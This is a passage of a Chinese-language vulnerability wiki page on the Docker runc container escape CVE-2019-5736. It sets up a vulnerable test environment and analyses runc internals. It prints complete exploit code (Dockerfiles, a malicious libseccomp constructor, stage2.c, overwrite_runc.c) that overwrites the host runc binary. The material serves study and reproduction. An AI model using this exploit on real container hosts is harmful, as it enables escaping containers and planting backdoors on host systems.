<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  
  <link rel="shortcut icon" href="../../img/favicon.ico">
  <title>Cve 2019 5736 附件 - expwiki</title>
  <link href='https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700' rel='stylesheet' type='text/css'>

  <link rel="stylesheet" href="../../css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../../css/theme_extra.css" type="text/css" />
  <link rel="stylesheet" href="../../css/highlight.css">
  
  <script>
    // Current page data
    var mkdocs_page_name = "Cve 2019 5736 \u9644\u4ef6";
    var mkdocs_page_input_path = "userspace/cve-2019-5736-\u9644\u4ef6.md";
    var mkdocs_page_url = "/userspace/cve-2019-5736-\u9644\u4ef6/";
  </script>
  
  <script src="../../js/jquery-2.1.1.min.js"></script>
  <script src="../../js/modernizr-2.8.3.min.js"></script>
  <script type="text/javascript" src="../../js/highlight.pack.js"></script> 
  
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
      <div class="wy-side-nav-search">
        <a href="../.." class="icon icon-home"> expwiki</a>
        <div role="search">
  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
  </form>
</div>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
	<ul class="current">
	  
          
            <li class="toctree-l1">
		
    <a class="" href="../..">前言</a>
	    </li>
          
            <li class="toctree-l1">
		
    <span class="caption-text">linux用户态漏洞</span>
    <ul class="subnav">
                <li class="">
                    
    <a class="" href="../cve-2018-1000001-分析/">Cve 2018 1000001 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2018-1000001-附件/">Cve 2018 1000001 附件</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-12735-分析/">Cve 2019 12735 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-12735-附件/">Cve 2019 12735 附件</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-5736-分析/">Cve 2019 5736 分析</a>
                </li>
                <li class=" current">
                    
    <a class="current" href="./">Cve 2019 5736 附件</a>
    <ul class="subnav">
            
    <li class="toctree-l3"><a href="#docker-runccve-2019-5736">Docker runc容器逃逸漏洞分析附件(CVE-2019-5736)</a></li>
    
        <ul>
        
            <li><a class="toctree-l4" href="#_1">基础知识</a></li>
        
            <li><a class="toctree-l4" href="#_2">环境搭建</a></li>
        
            <li><a class="toctree-l4" href="#poc">复现环境PoC</a></li>
        
            <li><a class="toctree-l4" href="#exp">复现环境Exp</a></li>
        
            <li><a class="toctree-l4" href="#poc_1">其他Poc</a></li>
        
            <li><a class="toctree-l4" href="#runc">runc原理分析</a></li>
        
            <li><a class="toctree-l4" href="#_7">补丁分析</a></li>
        
        </ul>
    

    </ul>
                </li>
    </ul>
	    </li>
          
            <li class="toctree-l1">
		
    <span class="caption-text">linux内核态漏洞</span>
    <ul class="subnav">
                <li class="">
                    
    <a class="" href="../../kernel/cve-2018-18281-分析/">Cve 2018 18281 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../../kernel/cve-2018-18281-附件/">Cve 2018 18281 附件</a>
                </li>
                <li class="">
                    
    <a class="" href="../../kernel/cve-2019-13272-分析/">Cve 2019 13272 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../../kernel/cve-2019-13272-附件/">Cve 2019 13272 附件</a>
                </li>
    </ul>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../../acknowledgements/">致谢</a>
	    </li>
          
        </ul>
      </div>
      &nbsp;
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
        <a href="../..">expwiki</a>
      </nav>

      
      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="../..">Docs</a> &raquo;</li>
    
      
        
          <li>linux用户态漏洞 &raquo;</li>
        
      
    
    <li>Cve 2019 5736 附件</li>
    <li class="wy-breadcrumbs-aside">
      
    </li>
  </ul>
  <hr/>
</div>
          <div role="main">
            <div class="section">
              
                <h1 id="docker-runccve-2019-5736">Docker runc容器逃逸漏洞分析附件(CVE-2019-5736)</h1>
<h2 id="_1">基础知识</h2>
<p><strong>Docker</strong><br />
<a href="https://docs.docker.com/get-started/overview/">https://docs.docker.com/get-started/overview/</a><br />
<a href="https://docs.docker.com/engine/reference/run/">https://docs.docker.com/engine/reference/run/</a><br />
<a href="https://docs.docker.com/engine/reference/commandline/exec/">https://docs.docker.com/engine/reference/commandline/exec/</a></p>
<p><strong>Dockerfile</strong><br />
<a href="https://docs.docker.com/engine/reference/builder/">https://docs.docker.com/engine/reference/builder/</a>
<a href="https://docs.docker.com/engine/reference/builder/#from">https://docs.docker.com/engine/reference/builder/#from</a>
<a href="https://docs.docker.com/engine/reference/builder/#run">https://docs.docker.com/engine/reference/builder/#run</a>
<a href="https://docs.docker.com/engine/reference/builder/#add">https://docs.docker.com/engine/reference/builder/#add</a>
<a href="https://docs.docker.com/engine/reference/builder/#entrypoint">https://docs.docker.com/engine/reference/builder/#entrypoint</a></p>
<p><strong>OCI和runc</strong><br />
<a href="https://cizixs.com/2017/11/05/oci-and-runc/">https://cizixs.com/2017/11/05/oci-and-runc/</a></p>
<p><strong>几个易混淆的概念</strong>   </p>
<ul>
<li>
<p>runc和docker-runc<br />
runc是一个独立的进程，docker-runc是安装docker后，docker自带的runc，文中提到的可以理解成相同的意思。</p>
</li>
<li>
<p>docker.io和docker-ce<br />
docker.io是ubuntu的docker package的名称;
如果从docker官方源下载则是docker-ce, docker-ce-cli, containerd.io。
本文用的是有漏洞版本的ubuntu package 。</p>
</li>
</ul>
<p><strong>Linux Namespace</strong><br />
<a href="https://lwn.net/Articles/531114/">https://lwn.net/Articles/531114/</a></p>
<p><strong>Linux Control Group</strong><br />
<a href="https://www.infoq.cn/article/docker-kernel-knowledge-cgroups-resource-isolation/">https://www.infoq.cn/article/docker-kernel-knowledge-cgroups-resource-isolation/</a>  </p>
<p>cgroups (abbreviated from control groups) is a Linux kernel feature that limits, accounts for, and isolates the resource usage (CPU, memory, disk I/O, network, etc.) of a collection of processes.</p>
<p>cgroups用于对一组进程可以使用的系统资源做限制。</p>
<p><strong>libseccomp</strong><br />
<a href="https://github.com/seccomp/libseccomp">https://github.com/seccomp/libseccomp</a></p>
<p>The libseccomp library provides an easy to use, platform independent, interface to the Linux Kernel's syscall filtering mechanism.</p>
<p>runc的一个依赖库，用于限制容器进程可使用的系统调用。</p>
<pre><code>$ ldd /usr/sbin/runc
    linux-vdso.so.1 (0x00007fffd11e6000)
    libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f5f0bde7000)
    libseccomp.so.2 =&gt; /lib/x86_64-linux-gnu/libseccomp.so.2 (0x00007f5f0bba0000)
    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5f0b7af000)
    /lib64/ld-linux-x86-64.so.2 (0x00007f5f0c006000)
</code></pre>

<p><strong>procfs</strong><br />
porc文件系统是一个虚拟文件系统，通常mount到/proc目录，可以理解为系统内核向用户态开放的接口。</p>
<p><code>/proc/self/exe</code> 是当前进程可执行文件的符号链接；  </p>
<p><code>/proc/self/fd</code> 是一个目录，包含了当前进程打开的文件的符号链接，符号链接名称以文件描述符命名。</p>
<pre><code>$ more exploit.c 

$ ps -aux|grep -v grep|grep more
invinci+  18760  0.0  0.0  16836   900 pts/5    S+   03:28   0:00 more exploit.c
$ cd /proc/18760/fd
$ ls
0  1  2  3
$ file 3
3: symbolic link to /home/invincible/Desktop/runc_test/exp/exploit.c

</code></pre>

<h2 id="_2">环境搭建</h2>
<h4 id="_3">虚拟机安装</h4>
<p>系统镜像：<a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/18.04/ubuntu-18.04.4-desktop-amd64.iso">https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/18.04/ubuntu-18.04.4-desktop-amd64.iso</a></p>
<pre><code>#  创建虚拟机硬盘
$ qemu-img create -f qcow2 ubuntu18.04.4.img 10G

# 安装虚拟机
$ qemu-system-x86_64  -m 2048 -hda ubuntu18.04.4.img -cdrom ./ubuntu-18.04.4-desktop-amd64.iso

# 启动虚拟机
$ qemu-system-x86_64 -m 2048  ubuntu18.04.4.img
</code></pre>

<h4 id="docker">Docker安装</h4>
<p>使用Ubunt的发行版本的packeg: docker-io ( Docker官方仓库的packges: docker-ce, docker-ce-cli, container.io 漏洞已经修复)</p>
<p>查看可安装版本:</p>
<pre><code>$ apt-cache policy docker.io
docker.io:
  Installed: 17.12.1-0ubuntu1
  Candidate: 19.03.6-0ubuntu1~18.04.1
  Version table:
     19.03.6-0ubuntu1~18.04.1 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-updates/universe amd64 Packages
     18.09.7-0ubuntu1~18.04.4 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-security/universe amd64 Packages
 *** 17.12.1-0ubuntu1 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic/universe amd64 Packages
        100 /var/lib/dpkg/status
</code></pre>

<p>查看docker.io的changelog:</p>
<pre><code>$ PAGER=cat apt-get -q=2 changelog docker.io 
...
docker.io (18.09.2-0ubuntu1) disco; urgency=medium

  * Update to 18.09.2, including fix for CVE-2019-5736.
    - Convert components/engine/git-bundles/CVE-2019-5736.bundle into
      d/patches/0001-nsenter-clone-proc-self-exe-to-avoid-exposing-host-b.patch.
    - Hard code RUNC_COMMIT in d/rules for now.

 -- Michael Hudson-Doyle &lt;michael.hudson@ubuntu.com&gt;  Tue, 12 Feb 2019 10:55:11 +1300

...
</code></pre>

<p>在<a href="https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/docker.io_17.12.1-0ubuntu1_amd64.deb.html">官网</a>下载低版本<a href="http://archive.ubuntu.com/ubuntu/pool/universe/d/docker.io/docker.io_17.12.1-0ubuntu1_amd64.deb">package</a>，或者<a href="https://pan.baidu.com/s/1PO4OV_el6fQ0xgymF8FsXg">百度云</a> 密码:q9vg，下载后安装：</p>
<pre><code>$ sudo dpkg -i docker.io_17.12.1-0ubuntu1_amd64.deb
...

$ docker --version
Docker version 17.12.1-ce, build 7390fc6

$ docker-runc --version
runc version 1.0.0-rc4+dev
commit: 9f9c96235cc97674e935002fc3d78361b696a69e
spec: 1.0.0
</code></pre>

<p>或者直接apt-get安装(如果还有的话)：</p>
<pre><code>$ sudo apt-get install docker.io=17.12.1-0ubuntu1
</code></pre>

<h2 id="poc">复现环境PoC</h2>
<p>使用的是通过构造恶意容器镜像，当运行容器时触发漏洞的方式(<code>Docker run</code>)。</p>
<p>链接:<a href="https://pan.baidu.com/s/1HKZREeCc3TCu7LPTv5wm7A">https://pan.baidu.com/s/1HKZREeCc3TCu7LPTv5wm7A</a>  密码:piqr</p>
<pre><code>$ tree
.
├── Dockerfile
├── README
├── stage1.c
└── stage2.c

0 directories, 4 files
</code></pre>

<pre><code>$ cat Dockerfile
FROM ubuntu:18.04
# 继承ubuntu:18.04 image
RUN set -e -x ;\
    sed -i 's,# deb-src,deb-src,' /etc/apt/sources.list ;\
    apt -y update ;\
    apt-get -y install build-essential ;\
    cd /root ;\
    apt-get -y build-dep libseccomp ;\
    apt-get source libseccomp
    
ADD stage1.c /root/stage1.c
RUN set -e -x ;\
    cd /root/libseccomp-* ;\
    cat /root/stage1.c &gt;&gt; src/api.c ;\
    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\
    dpkg -i /root/*.deb
# libseccomp是runc加载的一个动态库
# 原Poc这里是cd /root/libseccomp-2.3.1, 但是apt-get source libseccomp会安装最新的版本，所以这个版本号需要修改
# 这几步是下载libseccomp的源码包，修改源码的src/api.c文件，追加写入了stage1.c的内容(给api.c增加了一个构造函数，在它的main函数之前执行)，将修改的libseccomp构建成dep包并安装

ADD stage2.c /root/stage2.c
RUN set -e -x ;\
    cd /root ;\
    gcc stage2.c -o /stage2
# 编译stage2.c，等待被stage1加载并执行

ENTRYPOINT [ &quot;/entrypoint&quot; ]


RUN set -e -x ;\
    ln -s /proc/self/exe /entrypoint
# 把/proc/self/exe设置为容器的entrypoint，让runc运行容器时执行/proc/self/exe
# 即在容器iamge中执行runc进程，进而加载恶意构造的动态库，执行后面的exp代码(stage1.c stage2.c, 完成对runc可执行文件的修改)
</code></pre>

<pre><code>$ cat stage1.

#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;


__attribute__ ((constructor)) void foo(void)
{
    int fd = open(&quot;/proc/self/exe&quot;, O_RDONLY);
    if (fd == -1 ) {
        printf(&quot;HAX: can't open /proc/self/exe\n&quot;);
        return;
    }
    printf(&quot;HAX: fd is %d\n&quot;, fd);
    char *argv2[3];
    argv2[0] = strdup(&quot;/stage2&quot;);
    char buf[128];
    snprintf(buf, 128, &quot;/proc/self/fd/%d&quot;, fd);
    argv2[1] = buf;
    argv2[2] = 0;
    execve(&quot;/stage2&quot;, argv2, NULL);
}


/*


__attribute__ ((constructor))
The constructor attribute causes the function to be called automatically before execution enters main (). 


打开当前进程的可执行文件，execve执行子进程stage2并将文件描述符作为参数传递给stage2
*/
</code></pre>

<pre><code>$ cat stage2.c
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;


int main(int argc, char **argv) {
    printf(&quot;HAX2: argv: %s\n&quot;, argv[1]);
    int fd = open(argv[1], O_RDWR|O_APPEND);
    printf(&quot;HAX2: fd: %d\n&quot;, fd);

    const char *poc = &quot;cve-2019-5736&quot;;
    int res = write(fd, poc, strlen(poc));
    printf(&quot;HAX2: res: %d, %d\n&quot;, res, errno);
}

/*
根据stage1传入的runc路径， 将poc追加写入该文件末尾，完成对宿主机runc可执行文件的修改。
*/
</code></pre>

<h2 id="exp">复现环境Exp</h2>
<p>链接:<a href="https://pan.baidu.com/s/1d1ABdQLDdKwEKkX2dW-cbw">https://pan.baidu.com/s/1d1ABdQLDdKwEKkX2dW-cbw</a>  密码:83fs</p>
<p><a href="https://github.com/twistlock/RunC-CVE-2019-5736">twistlock@github</a></p>
<h2 id="poc_1">其他Poc</h2>
<p><a href="https://github.com/twistlock/RunC-CVE-2019-5736">https://github.com/twistlock/RunC-CVE-2019-5736</a>  </p>
<p>其他版本-Go版本：<a href="https://github.com/Frichetten/CVE-2019-5736-PoC">by Frichetten@github</a><br />
其他版本-C版本：<a href="https://github.com/feexd/pocs/tree/master/CVE-2019-5736">by feexd</a><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">@github</a>  </p>
<p>下面介绍的是构造恶意容器进程触发漏洞的Poc。这种方式触发条件比另一种方式要更为苛刻，实际测试时由于无法控制程序时序，尝试了几次都失败了。</p>
<pre><code>$ tree
.
├── Dockerfile
├── bash_evil
├── new_runc
├── new_runc.c
├── overwrite_runc
├── overwrite_runc.c
└── replace.sh

</code></pre>

<pre><code>$ cat Dockerfile
FROM ubuntu:18.04

COPY replace.sh /
RUN [&quot;chmod&quot;, &quot;+x&quot;, &quot;/replace.sh&quot;]
COPY overwrite_runc /overwrite_runc
RUN [&quot;chmod&quot;, &quot;+x&quot;, &quot;/overwrite_runc&quot;]
COPY new_runc /

RUN [&quot;mv&quot;, &quot;/bin/bash&quot;, &quot;/bin/bash_original&quot;]
COPY bash_evil /bin/bash
RUN [&quot;chmod&quot;, &quot;+x&quot;, &quot;/bin/bash&quot;]

ENTRYPOINT [&quot;/bin/bash_original&quot;, &quot;/replace.sh&quot;]

# 将replace.sh, overwrite_runc, new_runc复制到容器iamge
# 将容器image的/bin/bash 替换成bash_evil
# 将replace.sh作为entrypoint在docker run时执行

</code></pre>

<pre><code>$ cat bash_evil
#!/proc/self/exe
</code></pre>

<pre><code>$ cat replace.sh
#!/bin/bash_original
echo &quot;[+] Waiting for runC to be executed in the container...&quot;

runc_pid=$(ps axf | grep /proc/self/exe | grep -v grep | awk '{print $1}')

# Wait for /proc/self/exe to be executed
while [ -z &quot;$runc_pid&quot; ]
do
    runc_pid=$(ps axf | grep /proc/self/exe | grep -v grep | awk '{print $1}')
done

# Call overwrite_runc with the symlink to the runC binary
./overwrite_runc /proc/${runc_pid}/exe

# 1. 持续检测进程，等待runc进程出现(表示修改后的/bin/sh被runc exec执行)
# 2. 执行overwrite_runc修改/proc/[runc-pid]/exe文件为new_runc

</code></pre>

<pre><code>$ cat new_runc.c

#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char *argv[])
{
    printf(&quot;\n**THE ALL NEW AND IMPROVED RUNC**\n\n&quot;);
    printf(&quot;\t[+] Your backdoor here -&gt;\n\n&quot;);
    return 0;
}
// 这里是覆盖runc文件的payload代码 

</code></pre>

<pre><code>$ cat overwrite_runc.c
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;

#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;

/* Simple Buffer*/
typedef struct Buffer
{
    int len;        // buffer length
    void * buff;    // buffer data
} Buffer;


#define FALSE 0
#define TRUE  1

const char * DEFAULT_NEW_RUNC_PATH = &quot;/new_runc&quot;;
const unsigned int PATH_MAX_LEN = 30;
const int OPEN_ERR = -1;
const int RET_ERR = 1;
const int RET_OK = 0;

const long WRITE_TIMEOUT = 99999999999999999;
Buffer read_new_runc(char * new_runc_path);


/*
* Usage: overwrite_runc &lt;/proc/runc_pid/exe&gt; &lt;new runc path&gt;
* Overwrites the runC binary.
*/
int main(int argc, char *argv[])
{
    int runc_fd_read, my_runc_fd, wc;
    char my_runc_fd_path[PATH_MAX_LEN];
    char * new_runc_path;                        // path to file to replace runc
    char * runc_exe_path;
    Buffer new_runc;


    if (argc == 1 || argc &gt; 3)
    {
        printf(&quot;Usage: %s &lt;/proc/runc_pid/exe&gt; &lt;new runc path&gt;\n&quot;, argv[0]);
        return RET_ERR;
    }


    /* Open /proc/runc_pid/exe for reading */
    runc_exe_path = argv[1];
    runc_fd_read = open(runc_exe_path, O_RDONLY);
    if (runc_fd_read == OPEN_ERR)
    {
        printf(&quot;[!] Couldn't open runC's exe %s\n&quot;, runc_exe_path);
        perror(&quot;[!] Open&quot;);
        return RET_ERR;
    }
    printf(&quot;[+] Got %s as fd %d in this process\n&quot;, runc_exe_path, runc_fd_read);



    /* Read new_runc */
    if (argc &lt; 3)
        new_runc_path = DEFAULT_NEW_RUNC_PATH;
    else
        new_runc_path = argv[2];
    new_runc = read_new_runc(new_runc_path);
    if (new_runc.buff == NULL)
    {
        close(runc_fd_read);
        return RET_ERR;
    }
    printf(&quot;[+] Read %d bytes from new runC\n&quot;, new_runc.len);


    /* Try to open /proc/self/fd/runc_fd_read for writing */
    /* Will Succeed after the runC process exits          */
    sprintf(my_runc_fd_path, &quot;/proc/self/fd/%d&quot;, runc_fd_read);
    int opened = FALSE;
    for (long count = 0; (!opened &amp;&amp; count &lt; WRITE_TIMEOUT); count++)
    {
        my_runc_fd = open(my_runc_fd_path, O_WRONLY | O_TRUNC);
        if (my_runc_fd != OPEN_ERR)
        {
            wc = write(my_runc_fd, new_runc.buff, new_runc.len);
            if (wc !=  new_runc.len)
            {
                printf(&quot;[!] Couldn't write to my process's runC's fd %s\n&quot;, my_runc_fd_path);
                close(my_runc_fd);
                close(runc_fd_read);
                free(new_runc.buff);
                return RET_ERR;
            }
            printf(&quot;[+] Opened runC (using %s) for writing\n&quot;, my_runc_fd_path);
            printf(&quot;[+] Succesfully overwritten runC\n&quot;);
            opened = TRUE;
        }
    }

    /* Clean ups &amp; return */
    close(my_runc_fd);
    close(runc_fd_read);
    free(new_runc.buff);
    if (opened == FALSE)
    {
        printf(&quot;[!] Reached timeout, couldn't write to runc at %s\n&quot;, my_runc_fd_path);
        return RET_ERR;
    }
    else
        printf(&quot;[+] Done, shuting down ...\n&quot;);

    fflush(stdout);
    return RET_OK;
}


/*
* Reads from the file at new_runc_path, returns a Buffer with new_runc's content.
*/
Buffer read_new_runc(char * new_runc_path)
{
    Buffer new_runc = {0, NULL};
    FILE *fp_new_runc;
    int file_size, rc;
    void * new_runc_content;
    char ch;


    // open new_Runc
    fp_new_runc = fopen(new_runc_path, &quot;r&quot;); // read mode
    if (fp_new_runc == NULL)
    {
      printf(&quot;[!] open file err while opening the new runc file %s\n&quot;, new_runc_path);
      return new_runc;
    }


    // Get file size and prepare buff
    fseek(fp_new_runc, 0L, SEEK_END);
    file_size = ftell(fp_new_runc);
    new_runc_content = malloc(file_size);
    rewind(fp_new_runc);


    rc = fread(new_runc_content, 1, file_size, fp_new_runc);
    if (rc != file_size)
    {
        printf(&quot;[!] Couldn't read from new runc file at %s\n&quot;, new_runc_path);
        free(new_runc_content);
        return new_runc;
    }


    fclose(fp_new_runc);
    new_runc.len = rc;
    new_runc.buff = new_runc_content;
    return new_runc;


}

</code></pre>

<p>使用：</p>
<pre><code>$ git clone https://github.com/twistlock/RunC-CVE-2019-5736

$ docker build -t cve-2019-5736:exec_POC ./RunC-CVE-2019-5736/exec_POC
$ docker run -d --rm --name poc_ctr cve-2019-5736:exec_POC
$ docker exec poc_ctr bash

</code></pre>

<p>实际测试：</p>
<pre><code># docker run --rm --name poc_ctr cve-2019-5736:exec_POC
[+] Waiting for runC to be executed in the container...
[!] Open: No such file or directory
[!] Couldn't open runC's exe /proc/2851/exe

</code></pre>

<h2 id="runc">runc原理分析</h2>
<h4 id="runc-run">runc run</h4>
<p>runc创建和运行容器的命令是：runc run，它代码流程相当于依次执行runc create和runc start命令。  </p>
<p>首先根据配置文件config.json创建容器对象linuxContainer，其中包含了namespace、cgroups、device和mountpoint等各种配置信息;  </p>
<p>然后通过创建子进程的方式执行 runc init，runc init进行一系列初始化后( 比如创建容器文件系统，加入和配置命名空间)，调用 execve syscall 将自己变成需要执行的容器进程;  </p>
<p>在此之前，会先通过写入命名管道exec.fifo阻塞，等待直至runc start命令执行，读取exec.fifo的内容。</p>
<h5 id="_4">容器创建</h5>
<p>容器创建主要工作是将OCI格式的配置文件config.json加载到内存linuxContainer结构体中</p>
<pre><code>type linuxContainer struct {
    id                   string
    root                 string
    config               *configs.Config
    cgroupManager        cgroups.Manager
    intelRdtManager      intelrdt.Manager
    initPath             string
    initArgs             []string
    initProcess          parentProcess
    initProcessStartTime uint64
    criuPath             string
    newuidmapPath        string
    newgidmapPath        string
    m                    sync.Mutex
    criuVersion          int
    state                containerState
    created              time.Time
}

</code></pre>

<p>结构体initProcess保存了创建容器初始化进程(runc init)的相关信息:</p>
<pre><code>type initProcess struct {
    cmd             *exec.Cmd
    messageSockPair filePair
    logFilePair     filePair
    config          *initConfig
    manager         cgroups.Manager
    intelRdtManager intelrdt.Manager
    container       *linuxContainer
    fds             []string
    process         *Process
    bootstrapData   io.Reader
    sharePidns      bool
}
</code></pre>

<p>创建容器时，设置了子进程的path和参数：<code>/proc/self/exe init</code> 即 <code>runc init</code>  </p>
<pre><code>// runc/libcontainer/factory_linux.go -&gt; New()

func New(root string, options ...func(*LinuxFactory) error) (Factory, error) {
    // ...
    l := &amp;LinuxFactory{
        Root:      root,
        InitPath:  &quot;/proc/self/exe&quot;,
        InitArgs:  []string{os.Args[0], &quot;init&quot;},
        Validator: validate.New(),
        CriuPath:  &quot;criu&quot;,
    }
    // ...
    return l, nil
}

</code></pre>

<pre><code>// runc/libcontainer/process_linux.go -&gt; start()

func (p *initProcess) start() (retErr error) {
  ...
  err := p.cmd.Start()
  ...

  // Wait for our first child to exit
  if err := p.waitForChildExit(childPid); err != nil {

  // ...
  p.sendConfig()

  // ...
  parseSync(p.messageSockPair.parent, func(sync *syncT) error {
    switch sync.Type {
        case procReady:
        // ...
        writeSync(p.messageSockPair.parent, procRun)
    case procHooks:
        writeSync(p.messageSockPair.parent, procResume)

}

</code></pre>

<p>p.cmd.Start()是使用的go的package exec，启动一个子进程执行系统命令。  </p>
<p>执行子进程需要的命令行配置在commandTemplate中设置</p>
<pre><code>// runc/libcontainer/container_linux.go -&gt; commandTemplate()

func (c *linuxContainer) commandTemplate(p *Process, childInitPipe *os.File, childLogPipe *os.File) *exec.Cmd {
    cmd := exec.Command(c.initPath, c.initArgs[1:]...)
    cmd.Args[0] = c.initArgs[0]
    cmd.Stdin = p.Stdin
    cmd.Stdout = p.Stdout
    cmd.Stderr = p.Stderr
    cmd.Dir = c.config.Rootfs

    if cmd.SysProcAttr == nil {
        cmd.SysProcAttr = &amp;syscall.SysProcAttr{}
    }

  cmd.Env = append(cmd.Env, fmt.Sprintf(&quot;GOMAXPROCS=%s&quot;, os.Getenv(&quot;GOMAXPROCS&quot;)))
    cmd.ExtraFiles = append(cmd.ExtraFiles, p.ExtraFiles...)
    if p.ConsoleSocket != nil {
        cmd.ExtraFiles = append(cmd.ExtraFiles, p.ConsoleSocket)
        cmd.Env = append(cmd.Env,
            fmt.Sprintf(&quot;_LIBCONTAINER_CONSOLE=%d&quot;, stdioFdCount+len(cmd.ExtraFiles)-1),
        )
    }
    cmd.ExtraFiles = append(cmd.ExtraFiles, childInitPipe)
    cmd.Env = append(cmd.Env
        fmt.Sprintf(&quot;_LIBCONTAINER_INITPIPE=%d&quot;, stdioFdCount+len(cmd.ExtraFiles)-1),
        fmt.Sprintf(&quot;_LIBCONTAINER_STATEDIR=%s&quot;, c.root),
    )


    cmd.ExtraFiles = append(cmd.ExtraFiles, childLogPipe)
    cmd.Env = append(cmd.Env,
        fmt.Sprintf(&quot;_LIBCONTAINER_LOGPIPE=%d&quot;, stdioFdCount+len(cmd.ExtraFiles)-1),
        fmt.Sprintf(&quot;_LIBCONTAINER_LOGLEVEL=%s&quot;, p.LogLevel),
    )
  // ...


  return c
}

</code></pre>

<h5 id="_5">容器初始化</h5>
<p>容器初始化通过<code>runc init</code>完成，可以说容器进程区别于正常系统进程的核心要素都是通过<code>runc init</code>来实现。<br />
它首先对当前进程完成容器进程需要的各种限制和隔离，然后通过系统调用execve将自己变成需要执行的进程。</p>
<pre><code>// runc/init.go

package main


import (
    // ...
    _ &quot;github.com/opencontainers/runc/libcontainer/nsenter&quot;
    // ...
)

// ...
var initCommand = cli.Command{
    Name:  &quot;init&quot;,
    Usage: `initialize the namespaces and launch the process (do not call it outside of runc)`,
  // ...
    Action: func(context *cli.Context) error {
        factory, _ := libcontainer.New(&quot;&quot;)
        if err := factory.StartInitialization(); err != nil {
        // ...
    },
}

</code></pre>

<pre><code>// runc/libcontainer/ nsenter/nsexec.c -&gt; nsexec()

void nsexec(void)
{
  // ...
  case JUMP_CHILD:{
    //...
    if (config.namespaces)
     join_namespaces(config.namespaces);

    if (config.cloneflags &amp; CLONE_NEWUSER) {
     if (unshare(CLONE_NEWUSER) &lt; 0)
      bail(&quot;failed to unshare user namespace&quot;);
     config.cloneflags &amp;= ~CLONE_NEWUSER;

    if (unshare(config.cloneflags &amp; ~CLONE_NEWCGROUP) &lt; 0)
      bail(&quot;failed to unshare namespaces&quot;);
    // ...
    }
}


</code></pre>

<p>容器初始化工作在这里完成，最后阻塞在write exec.fifo，等待容器启动</p>
<pre><code>// runc/libcontainer/standard_init_linux.go -&gt;  Init()

func (l *linuxStandardInit) Init() error {   
  ... 
  setupNetwork(l.config)
  ...
  setupRoute(l.config.Config)
  ...
  prepareRootfs(l.pipe, l.config)
  ...
  finalizeRootfs(l.config.Config)
  ...
  syncParentReady(l.pipe)
  ... 
  seccomp.InitSeccomp(l.config.Config.Seccomp)
  ...
  finalizeNamespace(l.config)
  ...
  name, err := exec.LookPath(l.config.Args[0])
  ...
  fd, err := unix.Open(fmt.Sprintf(&quot;/proc/self/fd/%d&quot;, l.fifoFd), unix.O_WRONLY|unix.O_CLOEXEC, 0)
  ...
  if _, err := unix.Write(fd, []byte(&quot;0&quot;)); err != nil {
  ...
  syscall.Exec(name, l.config.Args[0:], os.Environ())
  ...
}


</code></pre>

<p>init.go导入的package nsenter是做什么的？</p>
<pre><code>$ cat README.md
The `nsenter` package registers a special init constructor that is called before the Go runtime has a chance to boot.  

This provides us the ability to `setns` on existing namespaces 
and avoid the issues that the Go runtime has with multiple 
threads.  

This constructor will be called if this package is registered, 
imported, in your go application.

</code></pre>

<ul>
<li>对于Mount Namespace来说，一个具有多线程的进程是无法使用setns调用进入到对应的命名空间( the Go runtime has with multiple threads )。</li>
<li>所以通过CGO(CGO介绍见下文)在Go runtime 启动之前，执行一个构造函数也就是nsexec.c中的nsexec函数来进行setns操作。</li>
<li>这个构造函数会在nsenter package 被导入的时候执行。</li>
</ul>
<p>package nsenter的主要内容</p>
<pre><code>$ pwd
.../runc-master/libcontainer/nsenter
$ tree
.
├── README.md
├── cloned_binary.c
├── namespace.h
├── nsenter.go
├── nsenter_gccgo.go
├── nsenter_test.go
├── nsenter_unsupported.go
└── nsexec.c

0 directories, 8 files

</code></pre>

<pre><code>$ cat nsenter.go
// +build linux,!gccgo

package nsenter

/*
